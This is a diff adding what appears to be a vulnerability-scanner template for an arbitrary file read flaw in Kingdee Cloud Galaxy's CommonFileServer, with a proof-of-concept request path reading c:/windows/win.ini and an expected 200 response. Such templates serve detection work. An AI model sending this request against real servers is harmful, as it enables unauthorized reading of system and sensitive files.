@@ -1,0 +1,3 @@
+name: "金蝶云星空 CommonFileserver 任意文件读取漏洞"
+poc: "/CommonFileServer/c:/windows/win.ini"
+status_code: 200
